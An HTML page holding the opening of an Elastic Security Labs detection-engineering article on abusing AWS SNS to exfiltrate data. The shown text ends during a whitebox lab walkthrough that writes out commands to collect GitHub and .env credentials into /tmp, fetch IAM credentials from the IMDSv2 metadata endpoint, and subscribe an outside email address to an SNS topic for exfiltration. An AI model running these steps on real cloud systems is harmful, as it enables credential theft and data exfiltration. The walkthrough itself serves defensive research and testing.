<!DOCTYPE html><html lang="en"><head><meta charSet="utf-8"/><meta name="viewport" content="width=device-width"/><title>AWS SNS Abuse: Data Exfiltration and Phishing — Elastic Security Labs</title><meta name="description" content="During a recent internal collaboration, we  dug into publicly known SNS abuse attempts and our knowledge of the data source to develop detection capabilities."/><meta property="og:title" content="AWS SNS Abuse: Data Exfiltration and Phishing — Elastic Security Labs"/><meta property="og:description" content="During a recent internal collaboration, we  dug into publicly known SNS abuse attempts and our knowledge of the data source to develop detection capabilities."/><meta property="og:image" content="https://www.elastic.co/security-labs/assets/images/aws-sns-abuse/Security Labs Images 7.jpg?6391f5244813d15daee1b5bd8da16ad0"/><meta property="og:image:alt" content="During a recent internal collaboration, we  dug into publicly known SNS abuse attempts and our knowledge of the data source to develop detection capabilities."/><meta property="og:site_name"/><meta property="og:url" content="https://www.elastic.co/security-labs/aws-sns-abuse"/><meta property="og:type" content="website"/><meta name="twitter:card" content="summary_large_image"/><meta name="twitter:title" content="AWS SNS Abuse: Data Exfiltration and Phishing — Elastic Security Labs"/><meta name="twitter:description" content="During a recent internal collaboration, we  dug into publicly known SNS abuse attempts and our knowledge of the data source to develop detection capabilities."/><meta name="twitter:image" content="https://www.elastic.co/security-labs/assets/images/aws-sns-abuse/Security Labs Images 7.jpg?6391f5244813d15daee1b5bd8da16ad0"/><meta name="twitter:image:alt" content="During a recent internal collaboration, we  dug into publicly known SNS abuse attempts and our knowledge of the data source to develop detection capabilities."/><link rel="canonical" href="https://www.elastic.co/security-labs/aws-sns-abuse"/><link rel="preload" href="/security-labs/logo.svg" as="image" fetchpriority="high"/><link rel="preload" as="image" imageSrcSet="/security-labs/_next/image?url=%2Fsecurity-labs%2Fassets%2Fimages%2Faws-sns-abuse%2FSecurity%20Labs%20Images%207.jpg&amp;w=640&amp;q=75 640w, /security-labs/_next/image?url=%2Fsecurity-labs%2Fassets%2Fimages%2Faws-sns-abuse%2FSecurity%20Labs%20Images%207.jpg&amp;w=750&amp;q=75 750w, /security-labs/_next/image?url=%2Fsecurity-labs%2Fassets%2Fimages%2Faws-sns-abuse%2FSecurity%20Labs%20Images%207.jpg&amp;w=828&amp;q=75 828w, /security-labs/_next/image?url=%2Fsecurity-labs%2Fassets%2Fimages%2Faws-sns-abuse%2FSecurity%20Labs%20Images%207.jpg&amp;w=1080&amp;q=75 1080w, /security-labs/_next/image?url=%2Fsecurity-labs%2Fassets%2Fimages%2Faws-sns-abuse%2FSecurity%20Labs%20Images%207.jpg&amp;w=1200&amp;q=75 1200w, /security-labs/_next/image?url=%2Fsecurity-labs%2Fassets%2Fimages%2Faws-sns-abuse%2FSecurity%20Labs%20Images%207.jpg&amp;w=1920&amp;q=75 1920w, /security-labs/_next/image?url=%2Fsecurity-labs%2Fassets%2Fimages%2Faws-sns-abuse%2FSecurity%20Labs%20Images%207.jpg&amp;w=2048&amp;q=75 2048w, /security-labs/_next/image?url=%2Fsecurity-labs%2Fassets%2Fimages%2Faws-sns-abuse%2FSecurity%20Labs%20Images%207.jpg&amp;w=3840&amp;q=75 3840w" imageSizes="100vw" fetchpriority="high"/><meta name="next-head-count" content="19"/><script src="https://play.vidyard.com/embed/v4.js" type="text/javascript" async=""></script><link rel="icon" href="/security-labs/favicon.svg"/><link rel="mask-icon" href="/security-labs/favicon.svg" color="#1C1E23"/><link rel="apple-touch-icon" href="/security-labs/favicon.svg"/><meta name="theme-color" content="#1C1E23"/><link rel="preload" href="/security-labs/_next/static/media/6d93bde91c0c2823-s.p.woff2" as="font" type="font/woff2" crossorigin="anonymous" data-next-font="size-adjust"/><link rel="preload" href="/security-labs/_next/static/media/a34f9d1faa5f3315-s.p.woff2" as="font" type="font/woff2" crossorigin="anonymous" data-next-font="size-adjust"/><link rel="preload" href="/security-labs/_next/static/media/369c6e283c5acc6e-s.p.woff2" as="font" type="font/woff2" crossorigin="anonymous" data-next-font="size-adjust"/><link rel="preload" href="/security-labs/_next/static/media/92f44bb82993d879-s.p.woff2" as="font" type="font/woff2" crossorigin="anonymous" data-next-font="size-adjust"/><link rel="preload" href="/security-labs/_next/static/media/ee71530a747ff30b-s.p.woff2" as="font" type="font/woff2" crossorigin="anonymous" data-next-font="size-adjust"/><link rel="preload" href="/security-labs/_next/static/media/9fac010bc1f02be0-s.p.woff2" as="font" type="font/woff2" crossorigin="anonymous" data-next-font="size-adjust"/><link rel="preload" href="/security-labs/_next/static/media/cbf5fbad4d73afac-s.p.woff2" as="font" type="font/woff2" crossorigin="anonymous" data-next-font="size-adjust"/><script id="google-tag-manager" data-nscript="beforeInteractive">
          (function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
          new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
          j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
          'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
          })(window,document,'script','dataLayer','GTM-KNJMG2M');
          </script><link rel="preload" href="/security-labs/_next/static/css/265ed7605fd03477.css" as="style"/><link rel="stylesheet" href="/security-labs/_next/static/css/265ed7605fd03477.css" data-n-g=""/><link rel="preload" href="/security-labs/_next/static/css/1007ff9e696f6f88.css" as="style"/><link rel="stylesheet" href="/security-labs/_next/static/css/1007ff9e696f6f88.css" data-n-p=""/><noscript data-n-css=""></noscript><script defer="" nomodule="" src="/security-labs/_next/static/chunks/polyfills-78c92fac7aa8fdd8.js"></script><script src="/security-labs/_next/static/chunks/webpack-7987c6fda769d510.js" defer=""></script><script src="/security-labs/_next/static/chunks/framework-7a7e500878b44665.js" defer=""></script><script src="/security-labs/_next/static/chunks/main-ebd33a9f1cae5951.js" defer=""></script><script src="/security-labs/_next/static/chunks/pages/_app-cb8664d1d3df2511.js" defer=""></script><script src="/security-labs/_next/static/chunks/fec483df-43ee602fabdfe3a4.js" defer=""></script><script src="/security-labs/_next/static/chunks/877-34f408271ef44c22.js" defer=""></script><script src="/security-labs/_next/static/chunks/511-d08fe0fdd6f8a984.js" defer=""></script><script src="/security-labs/_next/static/chunks/683-a5053c37fe5bd0c9.js" defer=""></script><script src="/security-labs/_next/static/chunks/402-a0bbcede3ebcab45.js" defer=""></script><script src="/security-labs/_next/static/chunks/616-0b017b9cfa597392.js" defer=""></script><script src="/security-labs/_next/static/chunks/pages/%5Bslug%5D-b0c191de1a3710e4.js" defer=""></script><script src="/security-labs/_next/static/HfUB8udjYzGgHnApGHQQO/_buildManifest.js" defer=""></script><script src="/security-labs/_next/static/HfUB8udjYzGgHnApGHQQO/_ssgManifest.js" defer=""></script></head><body><noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-KNJMG2M" height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript><div id="__next"><main class="__variable_0351a5 __variable_1f211e __variable_a5b5f5 flex flex-col min-h-screen"><div class="scroll-percentage-container"><div class="scroll-percentage-bar" style="width:0%"></div></div><nav class="fixed w-full z-40" data-headlessui-state=""><div class="bg-gradient-to-b from-zinc-900 from-20% h-[200%] to-transparent absolute inset-0 z-0 pointer-events-none"></div><div class="container relative z-10"><div class="flex h-16 items-center justify-between"><div class="flex items-center justify-start w-full"><div><a class="hover:opacity-50 transition" href="/security-labs"><img alt="elastic security labs logo" fetchpriority="high" width="200" height="30" decoding="async" data-nimg="1" style="color:transparent" src="/security-labs/logo.svg"/></a></div><div class="hidden lg:ml-6 lg:block"><div class="flex space-x-4"><a class="flex lg:inline-flex font-light my-1 py-1 px-2 font-display font-semibold lg:text-sm xl:text-base items-center transition hover:hover-link hover:text-white focus:accessible-link-focus" href="/security-labs/about"><span>About</span></a><div class="relative" data-headlessui-state=""><div><button class="flex lg:inline-flex font-light my-1 py-1 px-2 font-display font-semibold lg:text-sm xl:text-base items-center transition hover:hover-link hover:text-white focus:accessible-link-focus" id="headlessui-menu-button-:R2kpm:" type="button" aria-haspopup="menu" aria-expanded="false" data-headlessui-state="">Topics<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20" fill="currentColor" aria-hidden="true" class="ml-1 -mr-1 h-4 w-4 text-zinc-400 relative top-[1px]"><path fill-rule="evenodd" d="M5.23 7.21a.75.75 0 011.06.02L10 11.168l3.71-3.938a.75.75 0 111.08 1.04l-4.25 4.5a.75.75 0 01-1.08 0l-4.25-4.5a.75.75 0 01.02-1.06z" clip-rule="evenodd"></path></svg></button></div></div><a class="flex lg:inline-flex font-light my-1 py-1 px-2 font-display font-semibold lg:text-sm xl:text-base items-center transition hover:hover-link hover:text-white focus:accessible-link-focus" href="/security-labs/category/vulnerability-updates"><span>Vulnerability updates</span></a><a class="flex lg:inline-flex font-light my-1 py-1 px-2 font-display font-semibold lg:text-sm xl:text-base items-center transition hover:hover-link hover:text-white focus:accessible-link-focus" href="/security-labs/category/reports"><span>Reports</span></a><a class="flex lg:inline-flex font-light my-1 py-1 px-2 font-display font-semibold lg:text-sm xl:text-base items-center transition hover:hover-link hover:text-white focus:accessible-link-focus" href="/security-labs/category/tools"><span>Tools</span></a></div></div><div class="hidden lg:ml-auto lg:block"><div class="flex items-center space-x-4"><a class="rounded flex items-center p-4 text-white focus:outline-none focus:ring-0 focus:ring-offset-1 focus:ring-offset-zinc-600 group" href="https://search.elastic.co/?location%5B0%5D=Security%20Labs&amp;referrer=https://www.elastic.co/security-labs/aws-sns-abuse"><div class="flex items-center relative font-display"><svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" aria-hidden="true" class="h-6 w-6"><path stroke-linecap="round" stroke-linejoin="round" d="M21 21l-5.197-5.197m0 0A7.5 7.5 0 105.196 5.196a7.5 7.5 0 0010.607 10.607z"></path></svg></div></a><a class="flex lg:inline-flex font-light my-1 py-1 px-2 font-display font-semibold lg:text-sm xl:text-base items-center transition hover:hover-link hover:text-white focus:accessible-link-focus" href="https://www.elastic.co/security-labs/rss/feed.xml"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20" fill="currentColor" aria-hidden="true" class="h-4 w-4 mr-1"><path d="M3.75 3a.75.75 0 00-.75.75v.5c0 .414.336.75.75.75H4c6.075 0 11 4.925 11 11v.25c0 .414.336.75.75.75h.5a.75.75 0 00.75-.75V16C17 8.82 11.18 3 4 3h-.25z"></path><path d="M3 8.75A.75.75 0 013.75 8H4a8 8 0 018 8v.25a.75.75 0 01-.75.75h-.5a.75.75 0 01-.75-.75V16a6 6 0 00-6-6h-.25A.75.75 0 013 9.25v-.5zM7 15a2 2 0 11-4 0 2 2 0 014 0z"></path></svg><span class="hidden xl:block">Subscribe</span></a><a class="font-display inline-flex items-center justify-center rounded font-semibold disabled:!select-none disabled:!bg-gray-400 bg-blue-600 text-white hover:bg-blue-500 enabled:hover:text-white/80 transition-colors px-4 py-2 text-sm flex-1 lg:flex-auto" href="https://cloud.elastic.co/registration?cta=cloud-registration&amp;tech=trial&amp;plcmt=navigation&amp;pg=security-labs">Start free trial</a><a class="font-display inline-flex items-center justify-center rounded font-semibold text-white disabled:!select-none disabled:!bg-gray-400 button px-4 py-2 text-sm flex-1 lg:flex-auto" href="https://www.elastic.co/contact">Contact sales</a></div></div></div><div class="-mr-2 flex lg:hidden"><a class="rounded flex items-center p-4 text-white focus:outline-none focus:ring-0 focus:ring-offset-1 focus:ring-offset-zinc-600 group" href="https://search.elastic.co/?location%5B0%5D=Security%20Labs&amp;referrer=https://www.elastic.co/security-labs/aws-sns-abuse"><div class="flex items-center relative font-display"><svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" aria-hidden="true" class="h-6 w-6"><path stroke-linecap="round" stroke-linejoin="round" d="M21 21l-5.197-5.197m0 0A7.5 7.5 0 105.196 5.196a7.5 7.5 0 0010.607 10.607z"></path></svg></div></a><button class="inline-flex items-center justify-center rounded-md p-2 text-gray-400 hover:bg-gray-700 hover:text-white focus:outline-none focus:ring-2 focus:ring-inset focus:ring-white" id="headlessui-disclosure-button-:R59m:" type="button" aria-expanded="false" data-headlessui-state=""><span class="sr-only">Open navigation menu</span><svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" aria-hidden="true" class="block h-6 w-6"><path stroke-linecap="round" stroke-linejoin="round" d="M3.75 6.75h16.5M3.75 12h16.5m-16.5 5.25h16.5"></path></svg></button></div></div></div></nav><main class="mb-20 flex-1 flex flex-col"><div class="h-48 md:h-64"><div class="after:absolute after:block after:bg-blue-400 after:blur-3xl after:content-[&#x27; &#x27;] after:h-96 after:opacity-5 after:right-0 after:rounded-full after:top-20 after:w-1/2 after:z-0 before:absolute before:block before:blur-3xl before:bg-orange-400 before:content-[&#x27; &#x27;] before:h-96 before:left-0 before:opacity-5 before:rounded-full before:w-1/2 before:z-0 w-full h-full relative"><div class="relative z-10 w-full h-[125%] -top-[25%] bg-no-repeat bg-cover bg-bottom flex items-center justify-center" style="background-image:url(/security-labs/grid.svg)"></div></div></div><article class="px-4"><div class="max-w-7xl mx-auto relative z-10 flex flex-col space-y-4"><div class="eyebrow break-words"><time class="block mb-2 md:mb-0 md:inline-block article-published-date" dateTime="2025-03-13T00:00:00.000Z">13 March 2025</time><span class="hidden md:inline-block md:mx-2">•</span><a class="hover:text-blue-400 text-xs md:text-sm whitespace-nowrap author-name" href="/security-labs/author/terrance-dejesus">Terrance DeJesus</a></div><h1 class="font-bold leading-tighter text-3xl md:text-5xl"><span>AWS SNS Abuse: Data Exfiltration and&nbsp;Phishing</span></h1><p class="text-zinc-200 text-base md:text-xl">Exploring how adversaries abuse AWS SNS services and detection capabilities</p><div class="flex items-center mt-4 text-zinc-200 text-sm space-x-4 border-t border-white/25 pt-4"><span class="flex items-center space-x-1"><svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" aria-hidden="true" class="h-4 w-4 text-zinc-400"><path stroke-linecap="round" stroke-linejoin="round" d="M12 6v6h4.5m4.5 0a9 9 0 11-18 0 9 9 0 0118 0z"></path></svg><span>31 min read</span></span><span class="flex items-center space-x-1"><svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" aria-hidden="true" class="h-4 w-4 text-zinc-400"><path stroke-linecap="round" stroke-linejoin="round" d="M9.568 3H5.25A2.25 2.25 0 003 5.25v4.318c0 .597.237 1.17.659 1.591l9.581 9.581c.699.699 1.78.872 2.607.33a18.095 18.095 0 005.223-5.223c.542-.827.369-1.908-.33-2.607L11.16 3.66A2.25 2.25 0 009.568 3z"></path><path stroke-linecap="round" stroke-linejoin="round" d="M6 6h.008v.008H6V6z"></path></svg><span><a class="hover:text-blue-400 whitespace-nowrap" href="/security-labs/category/security-research">Security research</a>, </span><span><a class="hover:text-blue-400 whitespace-nowrap" href="/security-labs/category/security-operations">Security operations</a></span></span></div></div><div class="max-w-7xl mx-auto"><div class="bg-zinc-900 border border-zinc-800 drop-shadow-lg p-5 sm:p-8 md:p-10 rounded-3xl mt-5 md:mt-10"><div class="relative w-full rounded-lg overflow-hidden aspect-video"><img alt="AWS SNS Abuse: Data Exfiltration and Phishing" fetchpriority="high" decoding="async" data-nimg="fill" class="object-cover absolute h-full w-full" style="position:absolute;height:100%;width:100%;left:0;top:0;right:0;bottom:0;color:transparent" sizes="100vw" srcSet="/security-labs/_next/image?url=%2Fsecurity-labs%2Fassets%2Fimages%2Faws-sns-abuse%2FSecurity%20Labs%20Images%207.jpg&amp;w=640&amp;q=75 640w, /security-labs/_next/image?url=%2Fsecurity-labs%2Fassets%2Fimages%2Faws-sns-abuse%2FSecurity%20Labs%20Images%207.jpg&amp;w=750&amp;q=75 750w, /security-labs/_next/image?url=%2Fsecurity-labs%2Fassets%2Fimages%2Faws-sns-abuse%2FSecurity%20Labs%20Images%207.jpg&amp;w=828&amp;q=75 828w, /security-labs/_next/image?url=%2Fsecurity-labs%2Fassets%2Fimages%2Faws-sns-abuse%2FSecurity%20Labs%20Images%207.jpg&amp;w=1080&amp;q=75 1080w, /security-labs/_next/image?url=%2Fsecurity-labs%2Fassets%2Fimages%2Faws-sns-abuse%2FSecurity%20Labs%20Images%207.jpg&amp;w=1200&amp;q=75 1200w, /security-labs/_next/image?url=%2Fsecurity-labs%2Fassets%2Fimages%2Faws-sns-abuse%2FSecurity%20Labs%20Images%207.jpg&amp;w=1920&amp;q=75 1920w, /security-labs/_next/image?url=%2Fsecurity-labs%2Fassets%2Fimages%2Faws-sns-abuse%2FSecurity%20Labs%20Images%207.jpg&amp;w=2048&amp;q=75 2048w, /security-labs/_next/image?url=%2Fsecurity-labs%2Fassets%2Fimages%2Faws-sns-abuse%2FSecurity%20Labs%20Images%207.jpg&amp;w=3840&amp;q=75 3840w" src="/security-labs/_next/image?url=%2Fsecurity-labs%2Fassets%2Fimages%2Faws-sns-abuse%2FSecurity%20Labs%20Images%207.jpg&amp;w=3840&amp;q=75"/><div class="absolute border border-white/50 inset-0 mix-blend-overlay rounded-lg z-10"></div></div></div></div><div class="lg:max-w-7xl mx-auto relative mt-12 lg:grid lg:grid-cols-4 lg:gap-8 items-start"><div class="flex justify-center lg:col-span-3"><div class="prose lg:prose-lg prose-invert w-full article-content"><div><h1 class="font-bold leading-tighter text-3xl md:text-5xl relative"><span id="preamble" class="absolute -top-32"></span>Preamble</h1>
<p>Welcome to another installment of AWS detection engineering with Elastic. This article will dive into both how threat adversaries (TA) leverage AWS’ Simple Notification Service (SNS) and how to hunt for indicators of abuse using that data source.</p>
<p>Expect to learn about potential techniques threat adversaries may exercise in regards to SNS. We will also explore security best practices, hardening roles and access, as well as how to craft threat detection logic for SNS abuse.</p>
<p>This research was the result of a recent internal collaboration that required us to leverage SNS for data exfiltration during a whitebox exercise. During this collaboration, we became intrigued by how a simple publication and subscription (pub/sub) service could be abused by adversaries to achieve various actions on objectives. We dug into publicly known SNS abuse attempts and our knowledge of the data source to assemble this research about detection opportunities.</p>
<p>Do enjoy!</p>
<h1 class="font-bold leading-tighter text-3xl md:text-5xl relative"><span id="understanding-aws-sns" class="absolute -top-32"></span>Understanding AWS SNS</h1>
<p>Before we get started on the details, let’s discuss what AWS SNS is to have a basic foundational understanding.</p>
<p>AWS SNS is a web service that allows users to send and receive notifications from the cloud. Think of it like a news feed service where a digital topic is created, those who are interested with updates subscribe via email, slack, etc. and when data is published to that topic, all subscribers are notified and receive it. This describes what is commonly referred to as a pub/sub service provided commonly by cloud service providers (CSP). In Azure, this is offered as <a href="https://azure.microsoft.com/en-us/products/web-pubsub">Web PubSub</a>, whereas GCP offers <a href="https://cloud.google.com/pubsub#documentation">Pub/Sub</a>. While the names of these services may slightly differ from platform to platform, the utility and purpose do not.</p>
<p>SNS provides two workflows, <a href="https://docs.aws.amazon.com/sns/latest/dg/sns-user-notifications.html">application-to-person</a> (A2P) , and <a href="https://docs.aws.amazon.com/sns/latest/dg/sns-system-to-system-messaging.html">application-to-application</a> (A2A) that serve different purposes. A2P workflows focus more on integral operation with AWS services such as Firehose, Lambda, SQS and more. However, for this article we are going to focus our attention on A2P workflows. As shown in the diagram below, an SNS topic is commonly created, allowing subscribers to leverage SMS, email or push notifications for receiving messages.</p>
<h1 class="font-bold leading-tighter text-3xl md:text-5xl relative"><span id="" class="absolute -top-32"></span></h1>
<h1 class="font-bold leading-tighter text-3xl md:text-5xl relative"><span id="-1" class="absolute -top-32"></span></h1>
<p><strong>Additional Features:</strong></p>
<p><strong>Filter Policies:</strong> Subscribers can  define filtering rules to receive only a relevant subset of messages if they choose. These filter policies are defined in JSON format; specifying which attributes of a message the subscriber is interested in. SNS evaluates these policies server-side before delivery to determine which subscribers the messages should be sent to.</p>
<p><strong>Encryption</strong>: SNS leverages <a href="https://docs.aws.amazon.com/sns/latest/dg/sns-server-side-encryption.html">server-side encryption</a> (SSE) using AWS Key Management Service (KMS) to secure messages at rest. When encryption is enabled, messages are encrypted before being stored in SNS and then decrypted upon delivery to the endpoint. This is of course important for maintaining the security of Personal Identifiable Information (PII) or other sensitive data such as account numbers. Not to fear, although SNS only encrypts at rest, other protocols (such as HTTPS) handle encryption in transit, making it end-to-end (E2E).</p>
<p><strong>Delivery Retries and Dead Letter Queues (DLQs)</strong>: SNS automatically retries message delivery to endpoints, such as SQS, Lambda, etc. in case of unexpected failures. However, messages that fail to deliver ultimately reside in <a href="https://docs.aws.amazon.com/sns/latest/dg/sns-dead-letter-queues.html">DLQs</a>, which is typically an AWS SQS queue enabling debugging for developers.</p>
<p><strong>Scalability</strong>: AWS SNS is designed to handle massive message volumes, automatically scaling to accommodate increasing traffic without manual intervention. There are no upfront provisioning requirements, and you pay only for what you use, making it cost-effective for most organizations.</p>
<p>AWS SNS is a powerful tool for facilitating communication in cloud environments. For a deeper understanding, we recommend diving into the existing <a href="https://docs.aws.amazon.com/sns/latest/dg/welcome.html">documentation</a> from AWS. However, its versatility and integration capabilities also make it susceptible to abuse. In the next section, we explore some scenarios where adversaries might leverage SNS for malicious purposes.</p>
<h1 class="font-bold leading-tighter text-3xl md:text-5xl relative"><span id="whitebox-testing" class="absolute -top-32"></span>Whitebox Testing</h1>
<p>Whitebox testing involves performing atomic emulations of malicious behavior in a controlled environment, with full visibility into the vulnerable or misconfigured infrastructure and its configurations. This approach is commonly employed in cloud environments to validate detection capabilities during the development of threat detection rules or models targeting specific tactics, techniques, and procedures (TTPs).. Unlike endpoint environments, where adversary simulations often involve detonating malware binaries and tools, cloud-based TTPs typically exploit existing API-driven services through &quot;living-off-the-cloud&quot; techniques, making this approach essential for accurate analysis and detection.</p>
<h2 class="font-bold text-2xl md:text-4xl relative"><span id="data-exfiltration-via-sns" class="absolute -top-32"></span>Data Exfiltration via SNS</h2>
<p>Exfiltration via SNS starts with creating a topic that serves as a proxy for receiving stolen data and delivering it to the external media source, such as email or mobile. Adversaries would then subscribe that media source to the topic so that any data received is forwarded to them. After this is staged, it is only a matter of packaging data and publishing it to the SNS topic, which handles the distribution. This method allows adversaries to bypass traditional data protection mechanisms such as network ACLs, and exfiltrate information to unauthorized external destinations.</p>
<p><strong>Example Workflow:</strong></p>
<ul>
<li>Land on EC2 instance and perform discovery of sensitive data, stage it for later</li>
<li>Leverage IMDSv2 and STS natively with the installed AWS CLI to get temporary creds</li>
<li>Create a topic in SNS and attach an external email address as a subscriber</li>
<li>Publish sensitive information to the topic, encoded in Base64 (or plaintext)</li>
<li>The external email address receives the exfiltrated data</li>
</ul>
<p></p>
<h3 class="font-bold leading-tight text-xl md:text-3xl relative"><span id="infrastructure-setup" class="absolute -top-32"></span>Infrastructure Setup</h3>
<p>For the victim infrastructure, we’ll use our preferred infrastructure-as-code (IaC) framework, Terraform.</p>
<p>A <a href="https://gist.github.com/terrancedejesus/a01aa8f75f715e6baa726a21fcdf2289">public gist</a> has been created, containing all the necessary files to follow this example.. In summary, these Terraform configurations deploy an EC2 instance in AWS within a public subnet. The setup includes a <a href="https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/user-data.html">user-data script</a> that adds dummy credentials for sensitive data as environment variables, and installs the AWS CLI to emulate a compromised environment. Additionally, the EC2 instance is assigned an IAM role with permissions for <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">sns:Publish</code>, <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">sns:Subscribe</code> and <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">sns:CreateTopic</code>.</p>
<p>There are several potential ways an adversary might gain initial access to this EC2 instance, including exploiting vulnerable web applications for web shell deployment, using stolen SSH credentials, password spraying or credential stuffing. Within this particular example scenario; let’s assume the attacker gained initial entry via a vulnerable web application, and subsequently uploaded a web shell. The next goal in this case would be persistence via credential access.. This is commonly seen <a href="https://www.wiz.io/blog/wiz-research-identifies-exploitation-in-the-wild-of-aviatrix-cve-2024-50603">in-the-wild</a> when adversaries target popular 3rd-party software or web apps such as Oracle WebLogic, Apache Tomcat, Atlassian Confluence, Microsoft Exchange and much more.</p>
<p>To get started, download the Terraform files from the gist.</p>
<ol>
<li>Adjust the variables in the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">variables.tf</code> file to match your setup.<!-- -->
<ol>
<li>Add your whitelisted IPv4 addressfor trusted_ip_cidr</li>
<li>Add your local SSH key file path to public_key_path</li>
<li>Ensure the ami_id.default is the correct AMI-ID for your region</li>
</ol>
</li>
<li>Run <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">terraform init</code> in the folder to initialize the working directory.</li>
</ol>
<p>When ready, run <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">terraform apply</code> to deploy the infrastructure.</p>
<p>A few reminders:</p>
<ul>
<li>Terraform uses your AWS CLI default profile, so ensure you’re working with the correct profile in your AWS configuration.</li>
<li>The provided AMI ID is specific to the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">us-east-1</code> region. If you&#x27;re deploying in a different region, update the AMI ID accordingly in the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">variables.tf</code> file.</li>
<li>Change <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">trusted_ip_cidr.default</code> in <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">variables.tf</code> from 0.0.0.0/0 (any IP) to your publicly known CIDR range.</li>
</ul>
<p></p>
<p><em>Terraform apply output</em></p>
<p>Let’s SSH into our EC2 instance to ensure that our sensitive credentials were created from the user-data script. Note in the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">outputs.tf</code> file, we ensured that the SSH command would be generated for us based on the key path and public IP of our EC2 instance.</p>
<p></p>
<p>With this infrastructure staged and confirmed, we can then move on to practical execution.</p>
<h3 class="font-bold leading-tight text-xl md:text-3xl relative"><span id="the-workflow-in-practice-exfiltrating-sensitive-credentials" class="absolute -top-32"></span>The Workflow in Practice: Exfiltrating Sensitive Credentials</h3>
<p>Let’s step through this workflow in practice, now that our infrastructure is established. As a reminder, the goal of our opportunistic adversary is to check for local credentials, grab what they can and stage the sensitive data locally. Since landing on this EC2 instance, we have identified the AWS CLI exists, and identified we have SNS permissions. Thus, we plan to create a SNS topic, register an external email as a subscriber and then exfiltrateour stolen credentials and other data as SNS messages.</p>
<p>Note: While this example is extremely simple, the goal is to focus on SNS as a methodology for exfiltration. The exact circumstances and scenario will differ depending on the specific infrastructure setup of the victim.</p>
<p><strong>Identify and Collect Credentials from Common Locations:</strong><br/>
<!-- -->Our adversary will target GitHub credentials files and .env files locally with some good ol’ fashioned Bash scripting. This will take the credentials from these files and drop them into the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/tmp</code> temporary folder, staging them for exfiltration.</p>
<p>Command: cat /home/ubuntu/.github/credentials /home/ubuntu/project.env &gt; /tmp/stolen_creds.txt</p>
<p></p>
<p><strong>Stage Exfiltration Method by Creating SNS Topic</strong><br/>
<!-- -->Let’s leverage the existing AWS CLI to create the SNS topic. As a reminder, this EC2 instance assumes the custom IAM role we created and attached, which allows it to create SNS topics and publish messages. Since the AWS CLI is pre-installed on our EC2 instance, it will retrieve temporary credentials from IMDSv2 for the assumed role when invoked. However, if this were not the case, an adversary could retrieve credentials natively with the following bash code.</p>
<pre><code># Fetch the IMDSv2 token
TOKEN=$(curl -X PUT &quot;http://169.254.169.254/latest/api/token&quot; -H &quot;X-aws-ec2-metadata-token-ttl-seconds: 21600&quot;)

# Get the IAM role name
ROLE_NAME=$(curl -H &quot;X-aws-ec2-metadata-token: $TOKEN&quot; http://169.254.169.254/latest/meta-data/iam/security-credentials/)

# Fetch the temporary credentials
CREDENTIALS=$(curl -H &quot;X-aws-ec2-metadata-token: $TOKEN&quot; http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE_NAME)

# Extract the Access Key, Secret Key, and Token
AWS_ACCESS_KEY_ID=$(echo $CREDENTIALS | jq -r &#x27;.AccessKeyId&#x27;)
AWS_SECRET_ACCESS_KEY=$(echo $CREDENTIALS | jq -r &#x27;.SecretAccessKey&#x27;)
AWS_SESSION_TOKEN=$(echo $CREDENTIALS | jq -r &#x27;.Token&#x27;)</code></pre>
<p>Once this is complete, let’s attempt to create our SNS topic and the email address that will be used as our external receiver for the exfiltrated data.</p>
<p>Create Topic Command: <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">TOPIC_ARN=$(aws sns create-topic --name &quot;whitebox-sns-topic&quot; --query &#x27;TopicArn&#x27; --output text)</code></p>
<p>Subscribe Command: <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">aws sns subscribe --topic-arn &quot;$TOPIC_ARN&quot; --protocol email --notification-endpoint &quot;adversary@protonmail.com&quot;</code></p>
